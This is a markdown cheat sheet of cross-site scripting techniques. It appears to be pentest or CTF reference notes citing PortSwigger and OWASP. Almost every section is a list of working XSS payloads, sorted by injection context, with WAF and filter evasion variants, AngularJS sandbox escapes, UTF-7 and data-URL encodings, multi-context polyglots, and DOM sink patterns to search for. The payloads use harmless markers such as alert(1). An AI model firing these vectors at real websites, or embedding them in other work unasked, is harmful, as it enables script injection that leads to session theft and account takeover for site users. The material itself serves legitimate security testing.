# XSS contexts and representative payloads

The single most important XSS skill: **classify the sink context first, then choose a vector whose break-out characters and execution primitive survive that context and any filter.** Payloads below are representative, drawn from the PortSwigger XSS cheat sheet (note 17) and the OWASP filter-evasion sheet (note 29). Use a benign marker (`alert(document.domain)`, `print()`, or an OOB callback), never real theft.

## Step 1: reveal the context
Send a unique canary with the characters that matter: `qzx1'"></script><svg>`. View source and see exactly where it lands and what was transformed (which of `'` `"` `<` `>` `` ` `` survived, what got encoded). The answer puts you in one of the contexts below.

## HTML body context
Input lands between tags.
- `<svg onload=alert(1)>`
- `<img src onerror=alert(1)>`
- `<details open ontoggle=alert(1)>`
- No-interaction focus: `<xss tabindex=1 autofocus onfocus=alert(1)>` (a custom `<xss>` tag also probes tag allowlists).
- If a parent element consumes tags, close it first: `<style><img title="</style><img src onerror=alert(1)>"></style>` (same for `noscript`, `noembed`, `xmp`, `iframe`, `textarea`, `title`, `select`).

## Quoted attribute context
Input is inside `"..."`.
- Break out: `"/onfocus=alert(1) tabindex=1 autofocus/` (slash works as an attribute separator; `autofocus` fires without a click).
- If you cannot break the quote but control a full attribute, add an event handler or `autofocus`.

## Unquoted attribute context
- `1 onfocus=alert(1) autofocus/` (a space ends the value).

## URL attribute context (href/src/action)
- `javascript:alert(1)`
- Tolerance tricks when filtered: `JaVaScript:`, leading control chars `\x01-\x20`, tab/newline in the scheme (`java&Tab;script:`), `javascript&colon;alert(1)`, numeric entity `&#106;avascript:`.
- Other URL sinks: `<iframe srcdoc="<img src=1 onerror=alert(1)>">`, `<form action=javascript:alert(1)>`, `<button formaction=javascript:alert(1)>`, `<svg><a xlink:href="javascript:alert(1)">`, `<script src="data:text/javascript,alert(1)">`.

## JavaScript string context
Input is inside `'...'` or `"..."` in a script.
- `'-alert(1)-'`
- `';alert(1)//`
- `';eval(name)//` with the payload stashed in `window.name` (see smuggling below).
- Keyword-split to dodge WAFs: `'-self['ale'+'rt'](1)-'`.

## JS comment / template literal context
- Close the comment, or inside backticks use `${alert(1)}`.
- Script-block injection with hoisting (declare the undefined var yourself so earlier code does not throw): `<script>eval(myUndefVar);var inject="HERE";var myUndefVar;alert(1);//";</script>`.

## Framework template context (AngularJS/Vue)
- Confirm: `{{7*7}}` -> `49`. Then a version-matched sandbox escape (see `advanced-techniques.md`), e.g. `{{constructor.constructor('alert(1)')()}}`. HTML-encoding does NOT help here.
- If quotes are stripped/encoded or `$eval` is blocked, the quoted escapes are dead: use the string-free, `$eval`-free charAt-override + `fromCharCode` escape in `advanced-techniques.md`, and hunt the real `$parse` sink (it may read a parameter **name**, not a value).

## Restricted-character fallbacks
- **No parentheses:** `<script>onerror=alert;throw 1</script>`, `` <script>alert`1`</script> ``, `<script>location='javascript:alert\x281\x29'</script>`.
- **No `>`:** `<svg onload=alert(1)//` or `<svg onload=alert(1)<!--`.
- **Length-limited:** short vectors like `` <q oncut=alert`` `` (16 chars) or stash in `window.name`.
- **Payload smuggling via `window.name`:** `<script>name='alert(1)';</script>` ... `<script>eval(name)</script>` (or `location=name`); carries any payload across a length/charset limit.
- **Keyword WAF:** `self['ale'+'rt'](self['doc'+'ument']['dom'+'ain'])`.

## Encoding / charset
- UTF-7 (legacy): `<meta charset="UTF-7">` + `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`.
- JS unicode/hex/octal escapes; HTML numeric entities in URL attributes; base64 data URL `<script src=data:text/javascript;base64,YWxlcnQoMSk=>`.
- Content-type/`nosniff` tricks: when a response reflects into a non-HTML type, test whether the browser still parses HTML (`image/svg+xml`, `text/vtt`, `application/xhtml+xml`).

## Polyglots (fire across several contexts at once)
Useful when you cannot see the context, or input lands in multiple places:
- `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
- A second variant swaps `<svg/onload=` for `<details/open/ontoggle=`.

## DOM XSS: sources and sinks
- Trace a **source** (`location.hash`/`.search`/`.href`, `document.cookie`/`.referrer`, `window.name`, `postMessage` data) to a **sink** (`innerHTML`, `document.write`, `eval`, `setTimeout(str)`, `script.src`, jQuery `$()`). DOM Invader automates source->sink discovery and suggests a PoC.
- Example sink patterns to grep: `.innerHTML =`, `document.write(`, `eval(`, `$(` with a variable, `setTimeout(` with a string, `.src =` built from input.

## Event-handler and tag menu (when `<script>` is filtered)
- No-interaction: `onload` (svg/body), `onerror` (img/script), `ontoggle` (details), `onfocus`+`autofocus`, `onanimationstart`/`ontransitionend` (with CSS), `onbeforematch` (`hidden=until-found`).
- Interaction: `onclick`, `onmouseover`, `oncut`/`oncopy`, `accesskey`+`onclick`.
- Tag allowlist probing: try a custom tag (`<xss ...>`) and uncommon elements; the cheat sheet lists which handlers need no interaction per tag.

Principle: the vector is chosen by (context break-out) x (surviving charset) x (execution primitive). Keep a no-parens, no-`>`, and `window.name` fallback ready for filtered targets.
